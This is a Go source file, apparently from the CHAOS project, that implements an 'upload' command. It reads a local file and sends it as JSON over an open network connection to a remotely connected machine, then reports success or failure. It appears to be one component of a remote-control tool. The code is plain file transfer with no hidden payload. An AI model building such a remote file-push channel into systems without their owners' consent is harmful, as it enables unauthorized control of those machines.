package upload

import (
	"encoding/json"
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/models"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	"github.com/tiagorlampert/CHAOS/internal/util/os"
	c "github.com/tiagorlampert/CHAOS/pkg/color"
	"github.com/tiagorlampert/CHAOS/pkg/util"
	"net"
)

type UploadUseCase struct {
	Connection net.Conn
}

func NewUploadUseCase(conn net.Conn) usecase.Upload {
	return &UploadUseCase{
		Connection: conn,
	}
}

func (u UploadUseCase) Validate(param []string) error {
	if len(param) != 3 || !util.Contains(param, "upload") {
		fmt.Println(c.Yellow, "[!] Invalid parameters to upload!")
		return fmt.Errorf("invalid parameters")
	}
	return nil
}

func (u UploadUseCase) File(filepathFrom string, filepathTo string) {
	file, err := os.ReadFile(filepathFrom)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading file")
		return
	}

	upload, err := json.Marshal(models.Upload{
		FilepathFrom: filepathFrom,
		FilepathTo:   filepathTo,
		Data:         file,
	})
	if err != nil {
		log.Error(err)
		return
	}

	if err = network.Send(u.Connection, models.Message{
		Command: "upload",
		Data:    upload,
	}); err != nil {
		log.WithField("cause", err.Error()).Error("error sending file")
		return
	}

	response, err := network.Read(u.Connection)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading response")
		return
	}

	if response.Error.HasError {
		fmt.Println(c.Red, "[!] Error processing file!", response.Error.Message)
		return
	}

	fmt.Println(c.Green, fmt.Sprintf("[*] File successfuly uploaded!"))
}
